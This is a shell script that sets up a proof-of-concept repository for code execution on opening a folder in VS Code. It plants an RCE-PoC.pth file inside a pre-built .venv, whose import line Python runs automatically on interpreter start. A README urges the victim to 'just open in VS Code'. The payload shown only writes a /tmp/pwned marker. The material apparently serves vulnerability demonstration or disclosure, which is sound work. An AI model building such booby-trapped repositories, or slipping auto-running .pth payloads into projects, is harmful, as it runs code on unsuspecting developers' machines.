mkdir -p .venv/bin .venv/lib/python3.14/site-packages
cat > .gitignore << 'EOF'
__pycache__/
*.pyc
dist/
build/
.vscode/
.idea/
EOF
cat > README.md << 'EOF'
# PoC Demo
Virtual environment is pre-configured - just open in VS Code.
EOF
cat > main.py << 'EOF'
def main():
    print("VS Code RCE PoC")
if __name__ == "__main__":
    main()
EOF
cat > .venv/pyvenv.cfg << 'EOF'
home = /usr/bin
include-system-site-packages = false
version = 3.14.4
executable = /usr/bin/python3
command = /usr/bin/python3 -m venv .venv
EOF
ln -sf /usr/bin/python3 .venv/bin/python3
cat > .venv/lib/python3.14/site-packages/RCE-PoC.pth << 'EOF'
import os; open("/tmp/pwned","w").write("pwned")
EOF
